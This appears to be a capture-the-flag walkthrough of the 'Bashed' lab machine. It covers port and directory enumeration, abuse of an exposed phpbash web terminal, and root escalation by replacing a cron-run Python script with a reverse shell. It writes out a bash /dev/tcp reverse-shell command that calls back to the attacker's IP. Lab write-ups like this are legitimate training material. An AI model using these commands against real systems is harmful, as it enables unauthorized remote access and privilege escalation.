# @author:M3tr1c_r00t
## Bashed!
![Bashed](https://user-images.githubusercontent.com/99975622/202862039-e78a24cc-0f68-40f4-a49d-75a9ffd2fede.png)

### Enumeration
Step 1: nmap and Gobuster 
![Screenshot_2022-11-16_20_23_00](https://user-images.githubusercontent.com/99975622/202862058-77be6473-4c70-4736-88de-554dcfb1fb2a.png)
Only one port is open. So lets visit it.
![Screenshot_2022-11-16_20_24_37](https://user-images.githubusercontent.com/99975622/202862155-cfc96543-4ebd-459d-96e0-703855abf6ba.png)
The site was working on a feature known as phpbash. Which is kind of an emulation of the terminal but in a site format.

After interacting for a while I found a way that i could use to get a reverse shell.
I created a reverse shell file bash script...
![Screenshot_2022-11-16_20_25_50](https://user-images.githubusercontent.com/99975622/202862582-4286437c-3d8f-4eec-85bb-56c5820099da.png)
echo "bash -c'bash -i >& /dev/tcp/10.10.14.99/1234 0>&1'" > reverse.sh
![Screenshot_2022-11-16_20_26_09](https://user-images.githubusercontent.com/99975622/202862671-8251b9ce-40d6-4039-858d-61ebd57f5a23.png)
And we got our reverse shell!

We can now read the user flag.
### Priv Esc
looking around in our the user's file system, we find a folder 'scripts'. 
In it there are two files.

![Screenshot_2022-11-16_20_27_49](https://user-images.githubusercontent.com/99975622/202862861-494c426e-6b98-4e95-9f46-83c2cb3f9d0a.png)
On checking out the two files, it seems like the test.py is being executed in a cron cycle....
![Screenshot_2022-11-16_20_27_55](https://user-images.githubusercontent.com/99975622/202862962-4ad54918-7bad-480e-b974-407c570252ab.png)
We can replace the file with a python reverse shell coz the script is being run by the root user.
![Screenshot_2022-11-16_20_29_36](https://user-images.githubusercontent.com/99975622/202863235-dff171b4-886d-4a31-af62-eb69e51bb403.png)
You can find this code from pentestmonkey's cheetsheet.

![Screenshot_2022-11-16_20_30_29](https://user-images.githubusercontent.com/99975622/202863295-c4e83c3a-d45e-4d25-a910-7908d0b0db5a.png)
We open a listener and we get a reverse shell as root!


